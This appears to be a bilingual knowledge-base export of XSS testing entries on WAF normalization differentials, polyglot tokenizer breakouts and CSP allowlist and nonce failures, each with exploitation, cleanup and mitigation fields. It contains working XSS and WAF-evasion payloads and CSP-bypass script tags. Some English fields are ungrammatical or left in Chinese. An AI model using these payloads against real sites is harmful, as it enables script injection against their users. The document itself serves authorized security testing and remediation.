description.en: record the order of URL_DECODE, HTML_ENTITY_DECODE, and related transformations in a test Web ACL, submit raw and single-encoded samples, and compare origin logs with browser DOM; minimize the original set one entry at a time and replace every callback or external destination with an isolated test endpoint.

attackChain.payload: ">%0D%0A%0D%0A ">'> 6'%22()%26%25%22%3E%3Csvg/onload=prompt(1)%3E/ ">

title.zh: 统一规范化并回归
title.en: Retest the AWS WAF and Cloud Front XSS Normalization Differential remediation boundary

description.zh: 让边缘与源站采用一致的单次规范化模型，使用 AWS 托管规则与精确作用域，并在应用最终 HTML sink 执行上下文编码和消毒；重放相同请求集，确认边缘、源站和浏览器对输入形成一致且安全的结果。
description.en: After applying the documented remediation, replay normal and abnormal baselines and confirm required behavior remains while edge action logs, the origin-received value, response DOM, and unique execution marker for one request correlate through a request identifier no longer appears.

overview.zh: AWS WAF/CloudFront XSS 规范化差异评估边缘防护、源站和浏览器之间的解析差异，而不是把 WAF 放行视为成功。需要核对的行为为：CloudFront、AWS WAF 文本转换、源站框架和浏览器对 CRLF、URL 编码与属性闭合是否得到不同字节序列。成立前提为：Web ACL 的转换顺序或匹配范围与源站解码链不一致，且应用最终把参数放入可执行 HTML 上下文。最终必须取得以下证据：同一请求的边缘动作日志、源站接收值、响应 DOM 与唯一执行标记可以通过请求 ID 关联。
overview.en: AWS WAF and Cloud Front XSS Normalization Differential checks whether Cloud Front, AWS WAF text transformations, the origin framework, and the browser derive different byte sequences from CRLF, URL encoding, and attribute closure. It applies when Web ACL transformation order or match scope differs from the origin decoding chain and the application finally places the parameter in an executable HTML context. A conclusion requires edge action logs, the origin-received value, response DOM, and unique execution marker for one request correlate through a request identifier; reflected text, simple network acceptance, or a browser compatibility difference alone is not proof.

vulnerability.zh: 多层处理出现风险的前提为：Web ACL 的转换顺序或匹配范围与源站解码链不一致，且应用最终把参数放入可执行 HTML 上下文。审计应使用同一请求标识关联边缘动作、源站接收字节、应用输出与浏览器结果，并据此判断“CloudFront、AWS WAF 文本转换、源站框架和浏览器对 CRLF、URL 编码与属性闭合是否得到不同字节序列”。只有 200 响应、告警缺失或规则未命中均不足以证明 XSS。
vulnerability.en: The risk exists when Web ACL transformation order or match scope differs from the origin decoding chain and the application finally places the parameter in an executable HTML context, allowing whether Cloud Front, AWS WAF text transformations, the origin framework, and the browser derive different byte sequences from CRLF, URL encoding, and attribute closure. Review the input source, final parsing context, browser or policy version, and edge action logs, the origin-received value, response DOM, and unique execution marker for one request correlate through a request identifier; otherwise record only an unconfirmed control differential.

exploitation.zh: 在测试 Web ACL 中逐项记录 URL_DECODE、HTML_ENTITY_DECODE 等转换顺序，分别提交原始和单层编码样例，并对比源站日志与浏览器 DOM。固定 WAF 规则集、源站版本与浏览器版本，先重放未编码基线，再逐类测试大小写、实体、空白或结构变化；命中后缩减为单一变换，并按“同一请求的边缘动作日志、源站接收值、响应 DOM 与唯一执行标记可以通过请求 ID 关联”完成确认。
exploitation.en: In an authorized isolated environment, record the order of URL_DECODE, HTML_ENTITY_DECODE, and related transformations in a test Web ACL, submit raw and single-encoded samples, and compare origin logs with browser DOM. Replay the original command set with one-time harmless markers, change one encoding, element, event, or policy variable at a time, and retain request, final DOM, console, network, and server evidence to exclude cache, prefetch, and manual-interaction false positives.

mitigation.zh: 让边缘与源站采用一致的单次规范化模型，使用 AWS 托管规则与精确作用域，并在应用最终 HTML sink 执行上下文编码和消毒。修复同时覆盖边缘规则和最终应用 sink，再使用相同请求标识重放正常与异常样例，确认 WAF 动作、源站规范化和浏览器 DOM 三层结果一致。
mitigation.en: Remediation should align edge and origin on a single canonicalization model, use scoped AWS managed rules, and apply context encoding and sanitization at the final application HTML sink. Retest the normal baseline and minimized abnormal case in the same browser, policy, and input location to confirm required rendering, navigation, or resource loading remains available while execution, conditional requests, or object override evidence disappears.

name.zh: 结构闭合型 XSS Polyglot 集合

description.zh: 聚焦 title、style、textarea、script、属性和 MathML/SVG 等嵌套结构闭合，验证复杂输出位置中的 HTML tokenizer 状态转换。
description.en: Focuses on closing title, style, textarea, script, attribute, MathML, and SVG structures to test HTML tokenizer state transitions in complex output locations.

prerequisites.zh: 已定位 title、style、textarea、script、属性或 MathML/SVG 中的确切 HTML tokenizer 状态与模板包裹字符。
prerequisites.en: The exact HTML tokenizer state and template wrapper characters are identified for title, style, textarea, script, attribute, or MathML and SVG contexts.

prerequisites.zh: 每轮从 polyglot 缩减为一个结构闭合假设，使用固定 marker，并保存响应源码、tokenizer trace 与解析后 DOM。
prerequisites.en: Each run minimizes the polyglot to one structural-breakout hypothesis, uses a fixed marker, and preserves response source, tokenizer trace, and parsed DOM.

title.zh: XSS Polyglot Payloads (多上下文通用)
title.en: Validation step 1 for Structural-Breakout XSS Polyglot Set

execution.command: jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )// javascript:/*--> '>

description.zh: XSS Polyglot Payloads (多上下文通用)包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: Run this Structural-Breakout XSS Polyglot Set validation command in an authorized lab, preserve the output, and compare it with the documented baseline.

analysis.zh: 阳性证据是输入关闭目标原始 tokenizer 状态，建立活动元素或事件属性并执行 marker；必须报告具体闭合片段而非整条 polyglot。 假阳性边界：复杂字符串回显、浏览器错误恢复生成不同 DOM、部分标签被丢弃、仅在另一个上下文可执行或 WAF 放行均是假阳性。
analysis.en: Positive evidence requires the input to close the original tokenizer state, create an active element or event attribute, and execute the marker, with the exact breakout fragment reported rather than the whole polyglot. False-positive boundary: Reflection of a complex string, browser error recovery into a different inert DOM, dropped tags, execution only in another context, or WAF allowance is a false positive.

opsecTips.zh: 结构闭合测试每次只针对一个 tokenizer 状态；出现整个页面截断、表单结构破坏、事件循环、外连或导航时停止。
opsecTips.en: Structural-breakout testing targets one tokenizer state per run; stop on page truncation, damaged form structure, event loops, egress, or navigation.

opsecTips.zh: 删除 polyglot 记录和 DOM fixture，清理模板/页面缓存，恢复原包裹结构并用合法 title/style/textarea 内容回归。
opsecTips.en: Delete polyglot records and DOM fixtures, clear template and page caches, restore original wrappers, and regress with valid title, style, and textarea content.

title.zh: 定位“结构闭合型 XSS Polyglot 集合”的输出上下文

description.zh: 沿真实业务入口追踪到最终 HTML 位置，核对前提“不可信值落在不透明的嵌套模板中，应用只对常规 HTML 文本编码，或中间组件对编码结果再次解码和拼接”，并记录模板、消毒器和浏览器版本。
description.en: Trace the real input to the final sink or policy decision, confirm that untrusted data lands in an opaque nested template where only ordinary HTML-text encoding is applied or an intermediate component decodes and concatenates the value again, and record browser, response-header, and relevant component versions.

title.en: Retest the Structural-Breakout XSS Polyglot Set remediation boundary

description.zh: 由模板引擎在最终上下文自动转义，禁止组件重复解码，并对富 HTML 采用命名空间感知消毒器与 Trusted Types；随后重放正常内容和最小异常样例，确认业务显示正常且活动内容不再生成。
description.en: After applying the documented remediation, replay normal and abnormal baselines and confirm required behavior remains while the minimal state-specific breakout prefix, generated node, and execution event can all be explained from the final DOM rather than retaining an unexplained long string no longer appears.

overview.zh: 结构闭合型 XSS Polyglot 集合用于核对 HTML 解析器如何处理当前输出位置。具体审查目标为：组合闭合序列是否把 tokenizer 从 RCDATA、RAWTEXT、属性值或外来内容状态切换到可创建事件节点的状态。测试成立的前提为：不可信值落在不透明的嵌套模板中，应用只对常规 HTML 文本编码，或中间组件对编码结果再次解码和拼接。证据要求为：解析器状态对应的最小闭合前缀、生成节点和执行事件均可从最终 DOM 解释，避免保留无法说明原因的超长字符串。响应中出现输入文本或标签并不等同于脚本已经执行。
overview.en: Structural-Breakout XSS Polyglot Set checks whether a compound breakout moves the tokenizer from RCDATA, RAWTEXT, attribute-value, or foreign-content states into one that creates an event-capable node. It applies when untrusted data lands in an opaque nested template where only ordinary HTML-text encoding is applied or an intermediate component decodes and concatenates the value again. A conclusion requires the minimal state-specific breakout prefix, generated node, and execution event can all be explained from the final DOM rather than retaining an unexplained long string; reflected text, simple network acceptance, or a browser compatibility difference alone is not proof.

vulnerability.zh: 该问题的输入与输出前提为：不可信值落在不透明的嵌套模板中，应用只对常规 HTML 文本编码，或中间组件对编码结果再次解码和拼接。审查时必须确认“组合闭合序列是否把 tokenizer 从 RCDATA、RAWTEXT、属性值或外来内容状态切换到可创建事件节点的状态”，并把服务端响应、最终 DOM、事件条件和浏览器版本关联起来。若无法满足“解析器状态对应的最小闭合前缀、生成节点和执行事件均可从最终 DOM 解释，避免保留无法说明原因的超长字符串”这一证据要求，只能说明输入进入页面，不能确认 XSS。
vulnerability.en: The risk exists when untrusted data lands in an opaque nested template where only ordinary HTML-text encoding is applied or an intermediate component decodes and concatenates the value again, allowing whether a compound breakout moves the tokenizer from RCDATA, RAWTEXT, attribute-value, or foreign-content states into one that creates an event-capable node. Review the input source, final parsing context, browser or policy version, and the minimal state-specific breakout prefix, generated node, and execution event can all be explained from the final DOM rather than retaining an unexplained long string; otherwise record only an unconfirmed control differential.

exploitation.zh: 先确认当前元素和属性状态，再提交原 Polyglot；对命中项逐段删除前缀和后缀，直到得到能解释 tokenizer 转换的最小样例。为每行样例分配独立的无害标记，每轮只改变一种标签、属性或编码形式；同时保存原始响应、最终 DOM、控制台和事件记录，以排除缓存、浏览器容错及人工交互造成的假阳性。
exploitation.en: In an authorized isolated environment, identify the current element and attribute state before submitting the original polyglot, then delete prefixes and suffixes from a hit until the tokenizer transition has a minimal explainable sample. Replay the original command set with one-time harmless markers, change one encoding, element, event, or policy variable at a time, and retain request, final DOM, console, network, and server evidence to exclude cache, prefetch, and manual-interaction false positives.

mitigation.zh: 由模板引擎在最终上下文自动转义，禁止组件重复解码，并对富 HTML 采用命名空间感知消毒器与 Trusted Types。修复后在同一输出位置重放普通文本、边界字符和最小异常样例，确认合法内容继续显示，同时活动节点、危险属性和对应执行记录均不再出现。
mitigation.en: Remediation should use template auto-escaping at the final context, prohibit repeated decoding by components, and protect rich HTML with a namespace-aware sanitizer and Trusted Types. Retest the normal baseline and minimized abnormal case in the same browser, policy, and input location to confirm required rendering, navigation, or resource loading remains available while execution, conditional requests, or object override evidence disappears.

name.zh: Cloudflare WAF XSS 解析差异

description.zh: 使用事件、SVG、字符引用与 MathML 等变体对照 Cloudflare 托管规则、源站解码和浏览器解析，验证真实 XSS 而非单纯放行。
description.en: Compares event, SVG, character-reference, and MathML variants across Cloudflare managed rules, origin decoding, and browser parsing to prove real XSS rather than simple acceptance.

prerequisites.zh: 测试请求经过目标 Cloudflare zone、当前托管规则与转换后到达自有源站，且没有使用直连源站或管理员跳过规则。
prerequisites.en: Test requests traverse the target Cloudflare zone, current managed rules, and transformations to an owned origin without direct-origin access or administrator bypass.

prerequisites.zh: Cloudflare event、源站日志、响应字节和浏览器 DOM 以唯一请求令牌关联，并准备阻断与正常基线。
prerequisites.en: Cloudflare events, origin logs, response bytes, and browser DOM are correlated by a unique request token, with blocked and benign baselines prepared.

title.zh: 标准测试

description.zh: 标准payload
description.en: Standard payloads

analysis.zh: 阳性证据是变体穿过实际 Cloudflare 规则，源站在活动上下文输出后由浏览器执行 marker；放行、输出和执行三段必须连续。 假阳性边界：Cloudflare 返回 200/challenge、只隐藏告警、源站编码、浏览器生成惰性节点、缓存旧页面或直接源站成功都不是 WAF XSS 绕过。
analysis.en: Positive evidence requires a variant to pass the real Cloudflare rules, be emitted by the origin into an active context, and execute the browser marker, preserving the allow, output, and execution chain. False-positive boundary: A Cloudflare HTTP 200 or challenge, hidden alerts only, origin encoding, an inert browser node, a cached old page, or direct-origin success is not a WAF XSS bypass.

opsecTips.zh: Cloudflare 差异测试仅限专用 URL 与速率；发现生产缓存、真实访客、Bot 管理升级、规则变化或源站异常时停止。
opsecTips.en: Cloudflare differential testing is limited to a dedicated URL and rate; stop on production cache involvement, real visitors, bot escalation, rule changes, or origin anomalies.

opsecTips.zh: 撤销测试规则/跳过项，清除专用缓存与测试页面，删除 edge/origin 调试日志和 marker，再重放正常与阻断基线。
opsecTips.en: Revert test rules and skips, purge dedicated caches and test pages, delete edge and origin debug logs plus markers, then replay benign and blocked baselines.

description.zh: 记录边缘规则、文本转换顺序、源站框架与浏览器版本，并界定前提“规则版本或自定义跳过规则未覆盖实际参数，源站继续把被放行值输出到可执行 HTML 上下文”的实际范围。
description.en: Trace the real input to the final sink or policy decision, confirm that the active rule version or a custom skip rule does not inspect the relevant parameter and the origin still emits the accepted value into an executable HTML context, and record browser, response-header, and relevant component versions.

title.zh: 关联“Cloudflare WAF 差异测试”多层基线
title.en: Establish the Cloudflare WAF Differential Testing baseline

description.zh: 使用请求 ID 关联 WAF 动作、源站接收值和响应 DOM，并以“Cloudflare 安全事件、Ray ID、源站日志、最终 DOM 与唯一执行标记能够逐请求关联”作为最终证据要求。
description.en: Use a unique inert marker to establish response, DOM, network, and log baselines, accepting only Cloudflare security events, Ray ID, origin logs, final DOM, and a unique execution marker correlate per request as valid evidence.

title.zh: 逐变换验证“Cloudflare WAF XSS 解析差异”
title.en: Run a single-variable Cloudflare WAF XSS Parsing Differential check

description.zh: 固定规则集和浏览器版本，对每个变体记录阻断、挑战或放行动作；仅对放行项在隔离页面复核 DOM 与执行，不进行高频批量探测；每轮只改变一种编码或语法形式，并将命中项缩减到可解释的最小差异。
description.en: pin the ruleset and browser version, record block, challenge, or allow actions per variant, and verify DOM plus execution only for accepted cases in an isolated page without high-rate probing; minimize the original set one entry at a time and replace every callback or external destination with an isolated test endpoint.

title.zh: 统一规范化并回归
title.en: Retest the Cloudflare WAF XSS Parsing Differential remediation boundary

description.zh: 升级并调优 Cloudflare 托管规则，删除不必要的跳过条件，同时在源站统一解码、按上下文编码并部署严格 CSP；重放相同请求集，确认边缘、源站和浏览器对输入形成一致且安全的结果。
description.en: After applying the documented remediation, replay normal and abnormal baselines and confirm required behavior remains while Cloudflare security events, Ray ID, origin logs, final DOM, and a unique execution marker correlate per request no longer appears.

overview.zh: Cloudflare WAF XSS 解析差异评估边缘防护、源站和浏览器之间的解析差异，而不是把 WAF 放行视为成功。需要核对的行为为：Cloudflare 规则集与浏览器对混合大小写、实体编码、外来内容和事件属性是否产生不同解析结果。成立前提为：规则版本或自定义跳过规则未覆盖实际参数，源站继续把被放行值输出到可执行 HTML 上下文。最终必须取得以下证据：Cloudflare 安全事件、Ray ID、源站日志、最终 DOM 与唯一执行标记能够逐请求关联。
overview.en: Cloudflare WAF XSS Parsing Differential checks whether Cloudflare rules and the browser derive different results from mixed case, entity encoding, foreign content, and event attributes. It applies when the active rule version or a custom skip rule does not inspect the relevant parameter and the origin still emits the accepted value into an executable HTML context. A conclusion requires Cloudflare security events, Ray ID, origin logs, final DOM, and a unique execution marker correlate per request; reflected text, simple network acceptance, or a browser compatibility difference alone is not proof.

vulnerability.zh: 多层处理出现风险的前提为：规则版本或自定义跳过规则未覆盖实际参数，源站继续把被放行值输出到可执行 HTML 上下文。审计应使用同一请求标识关联边缘动作、源站接收字节、应用输出与浏览器结果，并据此判断“Cloudflare 规则集与浏览器对混合大小写、实体编码、外来内容和事件属性是否产生不同解析结果”。只有 200 响应、告警缺失或规则未命中均不足以证明 XSS。
vulnerability.en: The risk exists when the active rule version or a custom skip rule does not inspect the relevant parameter and the origin still emits the accepted value into an executable HTML context, allowing whether Cloudflare rules and the browser derive different results from mixed case, entity encoding, foreign content, and event attributes. Review the input source, final parsing context, browser or policy version, and Cloudflare security events, Ray ID, origin logs, final DOM, and a unique execution marker correlate per request; otherwise record only an unconfirmed control differential.

exploitation.zh: 固定规则集和浏览器版本，对每个变体记录阻断、挑战或放行动作；仅对放行项在隔离页面复核 DOM 与执行，不进行高频批量探测。固定 WAF 规则集、源站版本与浏览器版本，先重放未编码基线，再逐类测试大小写、实体、空白或结构变化；命中后缩减为单一变换，并按“Cloudflare 安全事件、Ray ID、源站日志、最终 DOM 与唯一执行标记能够逐请求关联”完成确认。
exploitation.en: In an authorized isolated environment, pin the ruleset and browser version, record block, challenge, or allow actions per variant, and verify DOM plus execution only for accepted cases in an isolated page without high-rate probing. Replay the original command set with one-time harmless markers, change one encoding, element, event, or policy variable at a time, and retain request, final DOM, console, network, and server evidence to exclude cache, prefetch, and manual-interaction false positives.

mitigation.zh: 升级并调优 Cloudflare 托管规则，删除不必要的跳过条件，同时在源站统一解码、按上下文编码并部署严格 CSP。修复同时覆盖边缘规则和最终应用 sink，再使用相同请求标识重放正常与异常样例，确认 WAF 动作、源站规范化和浏览器 DOM 三层结果一致。
mitigation.en: Remediation should update and tune Cloudflare managed rules, remove unnecessary skip conditions, and still canonicalize once, encode by context, and deploy strict CSP at the origin. Retest the normal baseline and minimized abnormal case in the same browser, policy, and input location to confirm required rendering, navigation, or resource loading remains available while execution, conditional requests, or object override evidence disappears.

description.en: Uses compact SVG, focus-event, and media-error samples to compare Akamai protection policy decisions with the origin HTML output.

prerequisites.zh: 请求通过目标 Akamai property 和 App & API Protector policy 到达测试源，安全配置版本、行为链和缓存状态已固定。
prerequisites.en: Requests pass through the target Akamai property and App and API Protector policy to a test origin, with security configuration version, behavior chain, and cache state fixed.

title.zh: 标准测试

analysis.en: Positive evidence requires a short SVG, focus, or media-event variant to pass the current Akamai policy, remain unencoded at the origin, and execute the marker through the corresponding browser event. False-positive boundary: No security event, an allowed request, an origin error, an event attribute that never fires, a different Akamai configuration, or direct-origin behavior does not prove bypass.

overview.zh: Akamai App & API Protector XSS 差异评估边缘防护、源站和浏览器之间的解析差异，而不是把 WAF 放行视为成功。需要核对的行为为：Akamai 策略对自动焦点、媒体错误和 SVG onload 等事件入口的检测是否与最终浏览器事件模型一致。成立前提为：生产策略处于告警模式、例外范围过宽或参数解析不完整，并且源站允许事件属性进入 HTML。最终必须取得以下证据：Akamai 请求参考、策略动作、源站接收值和实际事件触发标记四项信息必须对应同一请求。
overview.en: Akamai App and API Protector XSS Differential checks whether Akamai policy detection for autofocus, media errors, and SVG onload matches the browser's final event model. It applies when the production policy is in alert mode, exceptions are too broad, or parameter parsing is incomplete while the origin permits event attributes in HTML. A conclusion requires the Akamai request reference, policy action, origin-received value, and actual event marker must correspond to one request; reflected text, simple network acceptance, or a browser compatibility difference alone is not proof.

vulnerability.zh: 多层处理出现风险的前提为：生产策略处于告警模式、例外范围过宽或参数解析不完整，并且源站允许事件属性进入 HTML。审计应使用同一请求标识关联边缘动作、源站接收字节、应用输出与浏览器结果，并据此判断“Akamai 策略对自动焦点、媒体错误和 SVG onload 等事件入口的检测是否与最终浏览器事件模型一致”。只有 200 响应、告警缺失或规则未命中均不足以证明 XSS。
vulnerability.en: The risk exists when the production policy is in alert mode, exceptions are too broad, or parameter parsing is incomplete while the origin permits event attributes in HTML, allowing whether Akamai policy detection for autofocus, media errors, and SVG onload matches the browser's final event model. Review the input source, final parsing context, browser or policy version, and the Akamai request reference, policy action, origin-received value, and actual event marker must correspond to one request; otherwise record only an unconfirmed control differential.

exploitation.zh: 在测试配置中逐条发送原样例，区分无需交互、需要焦点和依赖错误事件的触发条件，记录策略动作后才在隔离浏览器复核。固定 WAF 规则集、源站版本与浏览器版本，先重放未编码基线，再逐类测试大小写、实体、空白或结构变化；命中后缩减为单一变换，并按“Akamai 请求参考、策略动作、源站接收值和实际事件触发标记四项信息必须对应同一请求”完成确认。
exploitation.en: In an authorized isolated environment, send each original sample against a test configuration, separate automatic, focus-dependent, and error-dependent triggers, record the policy action, and only then verify in an isolated browser. Replay the original command set with one-time harmless markers, change one encoding, element, event, or policy variable at a time, and retain request, final DOM, console, network, and server evidence to exclude cache, prefetch, and manual-interaction false positives.

mitigation.zh: 将相关保护策略设为阻断并收紧例外和参数范围；源站应移除事件属性、执行上下文编码并以 CSP 限制脚本来源。修复同时覆盖边缘规则和最终应用 sink，再使用相同请求标识重放正常与异常样例，确认 WAF 动作、源站规范化和浏览器 DOM 三层结果一致。
mitigation.en: Remediation should place the relevant protection policy in blocking mode, narrow exceptions and parameter scope, and remove event attributes, encode output contexts, and restrict script sources at the origin. Retest the normal baseline and minimized abnormal case in the same browser, policy, and input location to confirm required rendering, navigation, or resource loading remains available while execution, conditional requests, or object override evidence disappears.

title.zh: 标准测试

description.zh: 标准payload
description.en: Standard payloads

opsecTips.en: Remove iframe, object, embed, and link nodes plus data or srcdoc test pages, clear Imperva and browser caches and logs, restore the policy, and reload.

name.zh: Wordfence WAF 动态求值差异

description.zh: 比较 javascript URL、属性拼接、字符串定时器、Function 与 eval 等形式在 WordPress、Wordfence 和浏览器中的处理差异。
description.en: Compares javascript UR Ls, property concatenation, string timers, Function, and eval across Word Press, Wordfence, and browser processing.

prerequisites.zh: 请求经过目标 WordPress 入口和已启用 Wordfence WAF，插件/规则版本已记录，输入随后进入真实可执行 HTML 或 JavaScript sink。
prerequisites.en: Requests traverse the target Word Press entry and enabled Wordfence WAF, with plugin and rule versions recorded, and input subsequently reaches a real executable HTML or Java Script sink.

prerequisites.zh: 使用最低权限测试账户和隔离文章/页面，Wordfence live traffic、PHP 输出、DOM 与动态求值调用以唯一 marker 关联。
prerequisites.en: A least-privilege test account and isolated post or page are used, with Wordfence live traffic, PHP output, DOM, and dynamic-evaluation calls correlated by a unique marker.

title.zh: 标准测试

description.zh: 标准payload
description.en: Standard payloads

analysis.zh: 阳性证据是动态属性访问、字符串定时器、Function 或 eval 变体穿过当前 Wordfence 防护，未被 WordPress 编码并在浏览器执行 marker。 假阳性边界：管理员白名单、学习模式、缓存旧文章、WAF 允许但 WordPress 转义、源码含危险函数或浏览器 CSP 阻断都不能证明绕过。
analysis.en: Positive evidence requires a dynamic property, string timer, Function, or eval variant to pass current Wordfence protection, remain unencoded by Word Press, and execute the browser marker. False-positive boundary: Administrator allowlisting, learning mode, a cached old post, WAF allowance followed by Word Press escaping, dangerous functions in source, or browser CSP blocking does not prove bypass.

opsecTips.zh: Wordfence 测试禁止修改生产文章、账户或防火墙模式；发现真实用户访问、自动封禁、登录状态变化或外连时停止。
opsecTips.en: Wordfence testing must not modify production posts, accounts, or firewall mode; stop on real-user access, automatic blocking, login-state changes, or egress.

opsecTips.zh: 删除隔离文章/评论和 marker，清理 WordPress/对象/CDN 缓存与 Wordfence 测试事件，恢复插件配置并复查前台/后台。
opsecTips.en: Delete isolated posts or comments and markers, clear Word Press, object, and CDN caches plus Wordfence test events, restore plugin configuration, and review frontend and admin views.

name.zh: CSP 允许列表与 Nonce 失效模式

description.en: Focuses on same-origin or trusted-CDN JSONP, controllable script resources, and leaked nonces to test CSP design failures without treating example domains as live exploit targets.

prerequisites.en: The page already permits script-element injection, the actual CSP header is captured, and control of a same-origin or trusted-CDN endpoint or real nonce disclosure or reuse in the current document is proven.

prerequisites.zh: 可信端点使用自有 mock，nonce 使用专用一次性测试值，记录 policy 解析、script 请求、响应体、nonce 匹配和 marker 调用栈。
prerequisites.en: Trusted endpoints use owned mocks, nonces use dedicated one-time test values, and policy parsing, script requests, response bodies, nonce matches, and marker call stacks are recorded.

title.zh: 标准测试

description.zh: 标准payload
description.en: Standard payloads

analysis.zh: 阳性证据是 CSP 因可控可信脚本端点或可复用 nonce 允许攻击者脚本，并在目标来源执行 marker；单纯列入 allowlist 不足。 假阳性边界：可信 CDN 不可写、JSONP callback 被限制、nonce 猜测/过期、策略仅 report-only、script 请求被 MIME 阻止或示例域名不存在都不是绕过。
analysis.en: Positive evidence requires CSP to allow attacker-controlled script through a controllable trusted endpoint or reusable nonce and execute the marker under the target origin; allowlist membership alone is insufficient. False-positive boundary: A nonwritable trusted CDN, restricted JSONP callback, guessed or stale nonce, report-only policy, MIME-blocked script, or nonexistent example domain is not a bypass.

opsecTips.zh: CSP 信任模型测试不得使用生产 nonce、真实 CDN 写权限或第三方端点；发现真实凭据/nonce、公共请求或持久脚本时停止。
opsecTips.en: CSP trust-model testing must not use production nonces, real CDN write access, or third-party endpoints; stop on real credentials or nonces, public requests, or persistent scripts.

opsecTips.zh: 轮换并删除测试 nonce，移除 mock 端点和注入 script，清理 CDN/script 缓存及 CSP 报告，并恢复生产策略副本。
opsecTips.en: Rotate and delete test nonces, remove mock endpoints and injected scripts, clear CDN and script caches plus CSP reports, and restore the production-policy copy.

title.zh: CSP绕过模式集合

description.zh: CSP绕过模式集合，共4条
description.en: bypass payloads

title.zh: 解析“CSP 允许列表与 Nonce 失效模式”的生效策略
title.en: Scope the CSP Allowlist and Nonce Failure Modes data flow

description.zh: 抓取最终响应头并展开指令回退，确认前提“页面已存在脚本元素注入，可信源提供可控 JavaScript 响应，或者 nonce 没有为每个响应随机生成并受到模板隔离”真实存在，而不是配置文档中的预期。
description.en: Trace the real input to the final sink or policy decision, confirm that the page already permits script-element injection, a trusted origin serves controllable Java Script, or the nonce is not freshly randomized per response and isolated from untrusted templates, and record browser, response-header, and relevant component versions.

title.zh: 建立“CSP 脚本信任模型”策略基线
title.en: Establish the CSP Script Trust Model baseline

description.zh: 用合法同源资源记录允许行为，再结合 CSP 违规事件、网络请求和证据标准“生效响应头、脚本请求来源、nonce 生成与复用证据以及唯一执行标记共同证明策略失效”区分结果。
description.en: Use a unique inert marker to establish response, DOM, network, and log baselines, accepting only the effective response header, script request origin, nonce generation or reuse evidence, and unique execution marker jointly prove policy failure as valid evidence.

title.zh: 逐能力验证“CSP 允许列表与 Nonce 失效模式”
title.en: Run a single-variable CSP Allowlist and Nonce Failure Modes check

description.zh: 从实际页面提取生效策略，确认可信源响应内容是否可控，并比较两次响应 nonce；仅用自有无害端点替换示例 URL 复核；将示例域替换为自有无害端点，每次只测试一种元素、指令或 URL 方案。
description.en: 从实际页面提取生效策略，确认可信源响应内容是否可控，并比较两次响应 nonce；仅用自有无害端点替换示例 URL 复核；将示例域替换为自有无害端点，每次只测试一种元素、指令或 URL 方案。

attackChain.payload:
<script src="/api/jsonp?callback=alert//"></script>
<script src="https://cdn.example.com/jsonp?callback=alert//"></script>
<script src="https://trusted-cdn.com/lib.js"></script>
<script nonce="leaked_nonce_value">alert()</script>

title.zh: 收紧 CSP 并执行回归
title.en: Retest the CSP Allowlist and Nonce Failure Modes remediation boundary

description.zh: 采用 strict-dynamic 配合每响应随机 nonce 或稳定脚本 hash，移除通配主机和不必要 JSONP，并确保 nonce 不进入用户可控模板或缓存；随后重放业务资源与异常输入，确认指令边界清晰且合法内容仍可加载。
description.en: After applying the documented remediation, replay normal and abnormal baselines and confirm required behavior remains while the effective response header, script request origin, nonce generation or reuse evidence, and unique execution marker jointly prove policy failure no longer appears.

overview.zh: CSP 允许列表与 Nonce 失效模式用于核对 CSP 指令与具体浏览器能力之间的控制边界。审查目标为：script-src 是否依赖可被攻击者借用的主机允许列表，或 nonce 是否可预测、复用、泄露并应用到注入脚本。策略问题的成立前提为：页面已存在脚本元素注入，可信源提供可控 JavaScript 响应，或者 nonce 没有为每个响应随机生成并受到模板隔离。判定证据为：生效响应头、脚本请求来源、nonce 生成与复用证据以及唯一执行标记共同证明策略失效；普通导航、预取或单次外连必须与脚本执行分开记录。
overview.en: CSP Allowlist and Nonce Failure Modes checks whether script-src relies on attacker-usable host allowlists or a nonce is predictable, reused, leaked, and applicable to an injected script. It applies when the page already permits script-element injection, a trusted origin serves controllable Java Script, or the nonce is not freshly randomized per response and isolated from untrusted templates. A conclusion requires the effective response header, script request origin, nonce generation or reuse evidence, and unique execution marker jointly prove policy failure; reflected text, simple network acceptance, or a browser compatibility difference alone is not proof.

vulnerability.zh: 策略风险的前提为：页面已存在脚本元素注入，可信源提供可控 JavaScript 响应，或者 nonce 没有为每个响应随机生成并受到模板隔离。评估需要从最终响应中的生效 CSP 出发，逐项判断“script-src 是否依赖可被攻击者借用的主机允许列表，或 nonce 是否可预测、复用、泄露并应用到注入脚本”。若没有“生效响应头、脚本请求来源、nonce 生成与复用证据以及唯一执行标记共同证明策略失效”，策略警告、资源请求或页面跳转都不能单独证明 CSP 被绕过。
vulnerability.en: The risk exists when the page already permits script-element injection, a trusted origin serves controllable Java Script, or the nonce is not freshly randomized per response and isolated from untrusted templates, allowing whether script-src relies on attacker-usable host allowlists or a nonce is predictable, reused, leaked, and applicable to an injected script. Review the input source, final parsing context, browser or policy version, and the effective response header, script request origin, nonce generation or reuse evidence, and unique execution marker jointly prove policy failure; otherwise record only an unconfirmed control differential.

exploitation.zh: 从实际页面提取生效策略，确认可信源响应内容是否可控，并比较两次响应 nonce；仅用自有无害端点替换示例 URL 复核。先保存完整响应头并展开指令回退关系，再以自有无害端点替换示例地址，记录 CSP 违规事件、网络 Initiator、最终 origin 和执行标记，分别评价每一种浏览器能力。
exploitation.en: 从实际页面提取生效策略，确认可信源响应内容是否可控，并比较两次响应 nonce；仅用自有无害端点替换示例 URL 复核。先保存完整响应头并展开指令回退关系，再以自有无害端点替换示例地址，记录 CSP 违规事件、网络 Initiator、最终 origin 和执行标记，分别评价每一种浏览器能力。

mitigation.zh: 采用 strict-dynamic 配合每响应随机 nonce 或稳定脚本 hash，移除通配主机和不必要 JSONP，并确保 nonce 不进入用户可控模板或缓存。在同一浏览器与缓存状态下重放合法资源、业务导航和原异常样例，确认必要功能仍可用，并且相关指令稳定阻断越界脚本、框架、基地址或资源外连。
mitigation.en: Remediation should use strict-dynamic with a fresh per-response nonce or stable script hashes, remove wildcard hosts and unnecessary JSONP, and keep nonces out of user-controlled templates and shared caches. Retest the normal baseline and minimized abnormal case in the same browser, policy, and input location to confirm required rendering, navigation, or resource loading remains available while execution, conditional requests, or object override evidence disappears.

name.zh: DOM Clobbering 命名属性覆盖

description.zh: 验证 id/name 元素是否覆盖 window 或 document 上预期的对象引用，使安全检查、配置或 URL 读取转向攻击者构造的 DOM 节点。
description.en: Tests whether id or name elements override expected window or document object references and redirect security checks, configuration, or URL reads to attacker-created DOM nodes.

prerequisites.zh: 应用在攻击者 HTML 插入后通过 window/document 命名属性读取配置、URL 或对象，且该引用没有被词法变量或模块作用域固定。
